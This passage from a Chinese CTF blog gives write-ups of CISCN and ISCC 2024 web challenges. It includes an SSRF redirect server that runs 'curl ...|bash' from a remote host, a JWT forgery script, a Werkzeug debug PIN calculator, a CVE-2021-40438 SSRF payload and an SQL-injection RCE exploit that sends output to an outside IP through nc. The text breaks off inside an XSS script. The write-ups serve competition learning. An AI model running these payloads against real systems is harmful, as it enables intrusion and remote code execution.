alt="cms1"></p><p>存在ssrf的漏洞下载源码看看</p><p><img src="/../../images/ciscn/ciscn2024/cms2.png" alt="cms2"></p><p><img src="/../../images/ciscn/ciscn2024/cms3.png" alt="cms3"></p><p>定位了thumb，有curl的，需要传内容，</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?s=api&amp;c=api&amp;m=qrcode&amp;text=1&amp;thumb=http://127.0.0.1/flag.php<br></code></pre></td></tr></table></figure><p>随便传点内容，试了不行需要，要用302跳转打内网</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, redirect<br><br>app = Flask(__name__)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-comment"># 重定向到带有反向shell命令的URL</span><br>    <span class="hljs-keyword">return</span> redirect(<span class="hljs-string">&quot;http://127.0.0.1/flag.php?cmd=curl%20http%3A%2F%2F8.130.42.113%3A5566%2Fttt%7Cbash&quot;</span>)<br><span class="hljs-string">&quot;)</span><br><span class="hljs-string"></span><br><span class="hljs-string">if __name__ == &#x27;__main__&#x27;:</span><br><span class="hljs-string">    app.run(host=&#x27;0.0.0.0&#x27;, port=8080)</span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure><p>传到linux服务器上面，python3开启httpserver到port上，打开flask服务，然后将thumb改为我们的<code>http://vps_ip:flask</code>端口上</p><p>然后nc监听另外一个端口（需要弹shell的</p><p>但是我始终没谈的起来，不明白是不是ctfshow的原因，大概的流程是如此</p><p>用php写也可以。这题只做个记录。</p><p>大概流程就是写个代码开端口a，用php环境开端口b，用hackbar发包改为服务器302重定向路径b,最后开nc监听端口a，在/readflag里面有。</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ISCC2024回顾</title>
    <link href="/2024/05/26/iscc/iscc2024/"/>
    <url>/2024/05/26/iscc/iscc2024/</url>
    
    <content type="html"><![CDATA[<p>前言:虽然是人脉顿悟赛，归根结底还是要总结一下，因为这个比赛好久没有认真学习了，先把这篇写完吧，只看web部分。</p><h1 id="web"><a class="markdownIt-Anchor" href="#web"></a> Web</h1><h2 id="week1"><a class="markdownIt-Anchor" href="#week1"></a> week1</h2><h3 id="还没想好名字的塔防游戏"><a class="markdownIt-Anchor" href="#还没想好名字的塔防游戏"></a> 还没想好名字的塔防游戏</h3><p>这题写的时候其实没有思路的，按照往常的web游戏思路都是改js就行或者玩到底，很多师傅玩的时候还是挺久的。</p><p>先按正常思路看源码搜alert</p><p><img src="/../../images/iscc2024/%E6%B8%B8%E6%88%8F1.png" alt="游戏1"></p><p>看这个以为是什么小说要社工，其实完全想法反了，再上一个图片</p><p><img src="/../../images/iscc2024/%E6%B8%B8%E6%88%8F.png" alt="游戏"></p><p>还有题目的提示  <strong>Flag格式为ISCC{xxx}，其中xxx共有18位，记得数清楚哦！</strong></p><p>仔细研究一下并不是所有的单词首字母都是大写，最后的flag其实就是游戏加提示开头字母大写的拼接起来。应该是ISCC{MDWTSGTMMCCSITTDWS}，也是记上一种新的游戏web了</p><h3 id="flask中的pin值计算"><a class="markdownIt-Anchor" href="#flask中的pin值计算"></a> Flask中的pin值计算</h3><p>这题写的时候后来又刷到pin的时候，小记录了一点，这边也简要写一下吧，后面打算写个pin的总结。</p><p>先上个图片</p><p><img src="/../../images/iscc2024/flaskpin.png" alt="游戏1"></p><p>首先也是看源码吧，没有靶机了，可以看出来是base64，解一下密码是/getusername，来到下面的页面，看到海螺其实想到哪个比赛的那个神奇的海螺，考察的知识点是ssit模板注入，看一下这一个页面并不是flask，挨个尝试输入app.py可以得到下面这个图</p><p><img src="/../../images/iscc2024/pin1.png" alt="pin1"></p><p>告诉我username， 输入这个会有回显pincalculate，那就是典型的算pin值的了。</p><p><img src="/../../images/iscc2024/pinu.png" alt="pinu"></p><p>进入crawler这个页面，是一个动态实时的数学计算题目，可以写一个脚本爬一下及时的答题</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-comment"># 发送GET请求获取数学表达式</span><br>response = requests.get(<span class="hljs-string">&quot;http://101.200.138.180:10006/get_expression&quot;</span>)<br><span class="hljs-comment"># 如果请求成功</span><br><span class="hljs-keyword">if</span> response.status_code == <span class="hljs-number">200</span>:<br>    <span class="hljs-comment"># 提取数学表达式</span><br>    expression = response.json()[<span class="hljs-string">&#x27;expression&#x27;</span>]<br>    <span class="hljs-comment"># 计算表达式的结果</span><br>    result = <span class="hljs-built_in">eval</span>(expression)<br>    <span class="hljs-comment"># 打印计算结果</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;计算结果:&quot;</span>, result)<br>    <span class="hljs-comment"># 将结果发送到网站</span><br>    response = requests.get(<span class="hljs-string">&quot;http://101.200.138.180:10006/crawler?answer=&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(result))<br>    <span class="hljs-comment"># 打印网站返回的响应内容</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;网站返回的响应:&quot;</span>, response.text)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-comment"># 如果请求失败，打印错误信息</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;获取数学表达式失败，状态码:&quot;</span>, response.status_code)<br><br></code></pre></td></tr></table></figure><p><img src="/../../images/iscc2024/pin2.png" alt="pin2"></p><p>知道了flask使用的版本以及uuidnode位于的地方。</p><p>进到/woddenfish的界面，敲了一会我是没敲出个所以然，看看源码给了提示是ISCC_muyu_2024。</p><p><a href="https://jwt.io/#debugger-io">JSON Web Tokens - jwt.io</a>这个网站改改吧，我好像是非预期，莫名其妙的bp点几下就进去了，应该是要根据这个改的进去之后</p><p><img src="/../../images/iscc2024/pin3.png" alt="pin3"></p><p>是这个样子，Unicode解密02:42:ac:18:00:02给了地址，接着去看machine_id</p><p>下面的一个界面我也没截图，大概就是一个俱乐部的界面吧也是需要用脚本跑的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python">![pin4](../../images/iscc2024/pin4.png)<span class="hljs-keyword">from</span> datetime <span class="hljs-keyword">import</span> timedelta<br><span class="hljs-keyword">from</span> json <span class="hljs-keyword">import</span> loads, dumps<br><span class="hljs-keyword">from</span> jwcrypto.common <span class="hljs-keyword">import</span> base64url_decode, base64url_encode<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">topic</span>(<span class="hljs-params">topic</span>):<br>    <span class="hljs-string">&quot;&quot;&quot; Use mix of JSON and compact format to insert forged claims including long expiration &quot;&quot;&quot;</span><br>    [header, payload, signature] = topic.split(<span class="hljs-string">&#x27;.&#x27;</span>)<br>    parsed_payload = loads(base64url_decode(payload))<br>    parsed_payload[<span class="hljs-string">&#x27;role&#x27;</span>] = <span class="hljs-string">&quot;vip&quot;</span><br>    fake_payload = base64url_encode(<br>        (dumps(parsed_payload, separators=(<span class="hljs-string">&#x27;,&#x27;</span>, <span class="hljs-string">&#x27;:&#x27;</span>))))<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#123;&quot;  &#x27;</span> + header + <span class="hljs-string">&#x27;.&#x27;</span> + fake_payload + <span class="hljs-string">&#x27;.&quot;:&quot;&quot;,&quot;protected&quot;:&quot;&#x27;</span> + header + <span class="hljs-string">&#x27;&quot;, &quot;payload&quot;:&quot;&#x27;</span> + payload + <span class="hljs-string">&#x27;&quot;,&quot;signature&quot;:&quot;&#x27;</span> + signature + <span class="hljs-string">&#x27;&quot;&#125;&#x27;</span><br>originaltoken = <span class="hljs-string">&#x27;&#x27;&#x27;这里面是页面的&#x27;&#x27;&#x27;</span><br>topic = topic(originaltoken)<br><span class="hljs-built_in">print</span>(topic)<br><br></code></pre></td></tr></table></figure><p>要给jwt一个验证带入跑一下就行。</p><p><img src="/../../images/iscc2024/pin4.png" alt="pin4"></p><p>得到supervip的key用GitHub脚本可以直接出，自己clone就行</p><p><img src="/../../images/iscc2024/pin5.png" alt="pin5"></p><p>之后伪造一下就行了</p><p><img src="/../../images/iscc2024/pin6.png" alt="pin6"></p><p>这样所有的数据就得到了，这里注意版本啊，劳累我交wp还把版本的交错了高版本sha1，低版本md5</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">from</span> itertools <span class="hljs-keyword">import</span> chain<br><br>probably_public_bits = [<br>    <span class="hljs-string">&#x27;&#x27;</span><span class="hljs-comment">#/etc/passwd</span><br>    <span class="hljs-string">&#x27;flask.app&#x27;</span>,<span class="hljs-comment">#默认值</span><br>    <span class="hljs-string">&#x27;Flask&#x27;</span>,<span class="hljs-comment">#默认值</span><br>    <span class="hljs-string">&#x27;/usr/local/lib/python3.11/site-packages/flask/app.py&#x27;</span><span class="hljs-comment">#moddir，报错得到</span><br>]<br><br>private_bits = [<br>    <span class="hljs-string">&#x27;&#x27;</span>,/sys/<span class="hljs-keyword">class</span>/net/eth0/address 十进制<br>    <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-comment">#看上面machine-id部分</span><br>]<br><br><span class="hljs-comment"># 下面为源码里面抄的，不需要修改</span><br>h = hashlib.sha1()<br><span class="hljs-keyword">for</span> bit <span class="hljs-keyword">in</span> chain(probably_public_bits, private_bits):<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> bit:<br>        <span class="hljs-keyword">continue</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(bit, <span class="hljs-built_in">str</span>):<br>        bit = bit.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>    h.update(bit)<br>h.update(<span class="hljs-string">b&#x27;cookiesalt&#x27;</span>)<br><br>cookie_name = <span class="hljs-string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="hljs-number">20</span>]<br><br>num = <span class="hljs-literal">None</span><br><span class="hljs-keyword">if</span> num <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>    h.update(<span class="hljs-string">b&#x27;pinsalt&#x27;</span>)<br>    num = (<span class="hljs-string">&#x27;%09d&#x27;</span> % <span class="hljs-built_in">int</span>(h.hexdigest(), <span class="hljs-number">16</span>))[:<span class="hljs-number">9</span>]<br><br>rv = <span class="hljs-literal">None</span><br><span class="hljs-keyword">if</span> rv <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>    <span class="hljs-keyword">for</span> group_size <span class="hljs-keyword">in</span> <span class="hljs-number">5</span>, <span class="hljs-number">4</span>, <span class="hljs-number">3</span>:<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(num) % group_size == <span class="hljs-number">0</span>:<br>            rv = <span class="hljs-string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="hljs-string">&#x27;0&#x27;</span>)<br>                          <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(num), group_size))<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">else</span>:<br>        rv = num<br><br><span class="hljs-built_in">print</span>(rv)<br></code></pre></td></tr></table></figure><p>最后再console里面交一下pin码就出答案了。</p><h3 id="与时俱进"><a class="markdownIt-Anchor" href="#与时俱进"></a> 与时俱进</h3><p>这题没写，最后的顿悟的太厉害了，我估摸着我跟着顿悟wp说不定还没交上，看起来也挺难的，如有有空再说吧，</p><h2 id="week2"><a class="markdownIt-Anchor" href="#week2"></a> week2</h2><h3 id="代码审计"><a class="markdownIt-Anchor" href="#代码审计"></a> 代码审计</h3><p>这题是原题啊[<a href="https://blog.csdn.net/qq_45837896/article/details/126026576#De1CTF_2019SSRF_Me_2">De1CTF 2019]SSRF Me</a>，跟着走一遍吧。下面是源码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#! /usr/bin/env python</span><br><span class="hljs-comment"># #encoding=utf-8</span><br>from flask import Flask<br>from flask import request<br>import socket<br>import hashlib<br>import urllib<br>import sys<br>import os<br>import json<br>reload(sys)<br>sys.setdefaultencoding(<span class="hljs-string">&#x27;latin1&#x27;</span>)<br> <br>app = Flask(__name__)<br> <br>secert_key = os.urandom(16)<br> <br>class Task:<br>    def __init__(self, action, param, sign, ip):<br>        self.action = action<br>        self.param = param<br>        self.sign = sign<br>        self.sandbox = md5(ip)<br>        <span class="hljs-keyword">if</span>(not os.path.exists(self.sandbox)):<br>            os.mkdir(self.sandbox)<br> <br>    def Exec(self):<br>        result = &#123;&#125;<br>        result[<span class="hljs-string">&#x27;code&#x27;</span>] = 500<br>        <span class="hljs-keyword">if</span> (self.checkSign()):<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;scan&quot;</span> <span class="hljs-keyword">in</span> self.action:<br>                tmpfile = open(<span class="hljs-string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="hljs-string">&#x27;w&#x27;</span>)<br>                resp = scan(self.param)<br>                <span class="hljs-keyword">if</span> (resp == <span class="hljs-string">&quot;Connection Timeout&quot;</span>):<br>                    result[<span class="hljs-string">&#x27;data&#x27;</span>] = resp<br>                <span class="hljs-keyword">else</span>:<br>                    <span class="hljs-built_in">print</span> resp<br>                    tmpfile.write(resp)<br>                    tmpfile.close()<br>                result[<span class="hljs-string">&#x27;code&#x27;</span>] = 200<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;read&quot;</span> <span class="hljs-keyword">in</span> self.action:<br>                f = open(<span class="hljs-string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="hljs-string">&#x27;r&#x27;</span>)<br>                result[<span class="hljs-string">&#x27;code&#x27;</span>] = 200<br>                result[<span class="hljs-string">&#x27;data&#x27;</span>] = f.read()<br>            <span class="hljs-keyword">if</span> result[<span class="hljs-string">&#x27;code&#x27;</span>] == 500:<br>                result[<span class="hljs-string">&#x27;data&#x27;</span>] = <span class="hljs-string">&quot;Action Error&quot;</span><br>        <span class="hljs-keyword">else</span>:<br>            result[<span class="hljs-string">&#x27;code&#x27;</span>] = 500<br>            result[<span class="hljs-string">&#x27;msg&#x27;</span>] = <span class="hljs-string">&quot;Sign Error&quot;</span><br>        <span class="hljs-built_in">return</span> result<br> <br>    def checkSign(self):<br>        <span class="hljs-keyword">if</span> (getSign(self.action, self.param) == self.sign):<br>            <span class="hljs-built_in">return</span> True<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">return</span> False<br> <br>@app.route(<span class="hljs-string">&quot;/geneSign&quot;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>])<br>def geneSign():<br>    param = urllib.unquote(request.args.get(<span class="hljs-string">&quot;param&quot;</span>, <span class="hljs-string">&quot;&quot;</span>))<br>    action = <span class="hljs-string">&quot;scan&quot;</span><br>    <span class="hljs-built_in">return</span> getSign(action, param)<br> <br>@app.route(<span class="hljs-string">&#x27;/De1ta&#x27;</span>,methods=[<span class="hljs-string">&#x27;GET&#x27;</span>,<span class="hljs-string">&#x27;POST&#x27;</span>])<br>def challenge():<br>    action = urllib.unquote(request.cookies.get(<span class="hljs-string">&quot;action&quot;</span>))<br>    param = urllib.unquote(request.args.get(<span class="hljs-string">&quot;param&quot;</span>, <span class="hljs-string">&quot;&quot;</span>))<br>    sign = urllib.unquote(request.cookies.get(<span class="hljs-string">&quot;sign&quot;</span>))<br>    ip = request.remote_addr<br>    <span class="hljs-keyword">if</span>(waf(param)):<br>        <span class="hljs-built_in">return</span> <span class="hljs-string">&quot;No Hacker!!!!&quot;</span><br>    task = Task(action, param, sign, ip)<br>    <span class="hljs-built_in">return</span> json.dumps(task.Exec())<br> <br>@app.route(<span class="hljs-string">&#x27;/&#x27;</span>)<br>def index():<br>    <span class="hljs-built_in">return</span> open(<span class="hljs-string">&quot;code.txt&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>).<span class="hljs-built_in">read</span>()<br> <br>def scan(param):<br>    socket.setdefaulttimeout(1)<br>    try:<br>        <span class="hljs-built_in">return</span> urllib.urlopen(param).<span class="hljs-built_in">read</span>()[:50]<br>    except:<br>        <span class="hljs-built_in">return</span> <span class="hljs-string">&quot;Connection Timeout&quot;</span><br> <br>def getSign(action, param):<br>    <span class="hljs-built_in">return</span> hashlib.md5(secert_key + param + action).hexdigest()<br> <br>def md5(content):<br>    <span class="hljs-built_in">return</span> hashlib.md5(content).hexdigest()<br> <br>def waf(param):<br>    check=param.strip().lower()<br>    <span class="hljs-keyword">if</span> check.startswith(<span class="hljs-string">&quot;gopher&quot;</span>) or check.startswith(<span class="hljs-string">&quot;file&quot;</span>):<br>        <span class="hljs-built_in">return</span> True<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">return</span> False<br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.debug = False<br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>,port=9999)<br></code></pre></td></tr></table></figure><p>定位到关键代码</p><p>有三个路由</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-string">&#x27;/&#x27;</span><br><span class="hljs-string">&#x27;/De1ta&#x27;</span><br><span class="hljs-string">&#x27;/geneSign&#x27;</span><br></code></pre></td></tr></table></figure><p>好懒累了，具体逻辑看原题吧我就说一下思路</p><p>使用if的判断</p><p>可以尝试用readscan绕过</p><p>param放要读的文件flag.txt</p><p>cookie里的action+GET里的param加密后要等于cookie里的sign</p><p>geneSign告诉我们param+关键字action的MD5加密是多少</p><p>那我们在/geneSign页面传param=flag.txtread就能算出来secret_key+flag.txt+readscan的值是多少，可以绕过弱比较</p><p>先获得sign的值</p><p>最终，回到<code>/De1ta</code>页面，<code>GET</code>传参<code>param=flag.txt</code>，<code>cookie</code>传参</p><p><img src="/../../images/iscc2024/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1.png" alt="代码审计"></p><h3 id="原神启动"><a class="markdownIt-Anchor" href="#原神启动"></a> 原神启动</h3><p>我们原神玩家也是出息了。</p><p>作为一个op能直接答题那还是看一下源码吧，与熊论禅</p><p><img src="/../../images/iscc2024/%E5%8E%9F%E7%A5%9E.png" alt="原神"></p><p>就是简单的答题，输入正确答案可以问问题，尝试输入flag，告诉我们在flag.txt</p><p><img src="/../../images/iscc2024/%E5%8E%9F%E7%A5%9E1.png" alt="原神1"></p><p>以为直接是flag的，交完之后也不对啊。尝试扫了一下，并没有发现有什么异端，挨个进入，发现<a href="http://101.200.138.180:8080/index.jsp%EF%BC%8C%E9%87%8C%E9%9D%A2%E5%8F%AF%E4%BB%A5%E6%98%BE%E7%A4%BA%E6%98%AF%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9A%84%E7%89%88%E6%9C%AC%E5%8F%B7%EF%BC%8C%E6%90%9C%E7%9C%8B%E7%9C%8B%E6%9C%89%E6%B2%A1%E6%9C%89cve">http://101.200.138.180:8080/index.jsp，里面可以显示是服务器的版本号，搜看看有没有cve</a></p><p><img src="/../../images/iscc2024/%E5%8E%9F%E7%A5%9E2.png" alt="原神2"></p><p>有漏洞可以利用，我们在虚拟机运行利用漏洞读取得到flag</p><p><img src="/../../images/iscc2024/%E5%8E%9F%E7%A5%9E3.png" alt="原神3"></p><h3 id="掉进阿帕奇的工资"><a class="markdownIt-Anchor" href="#掉进阿帕奇的工资"></a> 掉进阿帕奇的工资</h3><p>这题也难也是劳累</p><p>进入的页面是登陆界面，尝试用admin爆破密码进去的，爆破好久也是没进去，那就只能注册一个账号看看了。</p><p><img src="/../../images/iscc2024/%E9%98%BF%E5%B8%95%E5%A5%87.png" alt="阿帕奇"></p><p>？看看源码。</p><p><img src="/../../images/iscc2024/%E9%98%BF%E5%B8%95%E5%A5%871.png" alt="阿帕奇1"></p><p>还是学生就遭受了社会的毒打，要求是应该要是manager才能进入的啊</p><p>总结其实也不用改bp，就是页面注册的时候把信息都填好，验证问题选择第二个，然后修改密码选择回答问题，之后就可以登陆了</p><p><img src="/../../images/iscc2024/%E9%98%BF%E5%B8%95%E5%A5%872.png" alt="阿帕奇2"></p><p>进去就是一个界面。</p><p>在工资界面上尝试一会好像是异或，输入ls和]B，可以爆出所有的内容</p><p><img src="/../../images/iscc2024/%E9%98%BF%E5%B8%95%E5%A5%873.png" alt="阿帕奇3"></p><p>把所有的挨个试一下，结果应该是在Docfile</p><p><img src="/../../images/iscc2024/%E9%98%BF%E5%B8%95%E5%A5%874.png" alt="阿帕奇4"></p><p>一开始非预期可以直接用异或出的，环境修复之后就不行了，这题也考察的cve漏洞</p><p><a href="https://blog.csdn.net/qq_51398553/article/details/131299190">CVE-2021-40438</a>，按照流程也是最后出flag的</p><p>构造transfer.php?dashachun=unix:A……A|<a href="http://secret.host/flag%E5%BE%97%E5%88%B0flag">http://secret.host/flag得到flag</a></p><p><img src="/../../images/iscc2024/%E9%98%BF%E5%B8%95%E5%A5%875.png" alt="阿帕奇5"></p><h2 id="week3"><a class="markdownIt-Anchor" href="#week3"></a> week3</h2><p>这种全考反弹shell我i也是无奈了，最后的服务器环境也一直在爆，哎。</p><h3 id="这题我出不了了"><a class="markdownIt-Anchor" href="#这题我出不了了"></a> 这题我出不了了</h3><p>这题我也真的出不了啊</p><p><a href="https://over-rainbow.cn/posts/2017-hitcon-sql-so-hard/">原题</a>，跟着过一遍吧，原理看文章就行</p><p>Exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> randint<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-comment"># payload = &quot;union&quot;</span><br>payload = <span class="hljs-string">&quot;&quot;&quot;&#x27;,&#x27;&#x27;)/*%s*/returning(1)as&quot;\\&#x27;/*&quot;,(1)as&quot;\\&#x27;*/-(a=`child_process`)/*&quot;,(2)as&quot;\\&#x27;*/-(b=`/printFlag|nc 47.122.22.16 5566`)/*&quot;,(3)as&quot;\\&#x27;*/-console.log(process.mainModule.require(a).exec(b))]=1//&quot;--&quot;&quot;&quot;</span> % (<span class="hljs-string">&#x27; &#x27;</span>*<span class="hljs-number">1024</span>*<span class="hljs-number">1024</span>*<span class="hljs-number">16</span>)<br>username = <span class="hljs-built_in">str</span>(randint(<span class="hljs-number">1</span>, <span class="hljs-number">65535</span>))+<span class="hljs-built_in">str</span>(randint(<span class="hljs-number">1</span>, <span class="hljs-number">65535</span>))+<span class="hljs-built_in">str</span>(randint(<span class="hljs-number">1</span>, <span class="hljs-number">65535</span>))<br>data = &#123;<br>            <span class="hljs-string">&#x27;username&#x27;</span>: username+payload,<br>                <span class="hljs-string">&#x27;password&#x27;</span>: <span class="hljs-string">&#x27;AAAAAA&#x27;</span><br>                &#125;<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;ok&#x27;</span>)<br>r = requests.post(<span class="hljs-string">&#x27;http://101.200.138.180:32031/register_7D85tmEhhAdgGu92&#x27;</span>, data=data)<br><span class="hljs-built_in">print</span>(r.content.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br><br></code></pre></td></tr></table></figure><p>在跑的时候要多连几下，可能连不起来，自己要买台云服务器方便一点，根据实际情况来</p><p><img src="/../../images/iscc2024/%E5%87%BA%E4%B8%8D%E4%BA%86.png" alt="出不了"></p><h3 id="一道普通的xss题目"><a class="markdownIt-Anchor" href="#一道普通的xss题目"></a> 一道普通的XSS题目</h3><p>显然这也并不简单,这是一道国际赛的原题，当时还是爆零了，我们也借鉴借鉴</p><p><a href="https://blog.ankursundara.com/dicectf23-writeups/">文章</a>，对比原文可以看出基本没有变化，也是跟着思路来一遍吧(这不就是炒冷饭，我太失败了)</p><p>改一下脚本，改个vps和端口，然后用node.js跑一下就可以了</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs js">xmls = <span class="hljs-string">`&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span 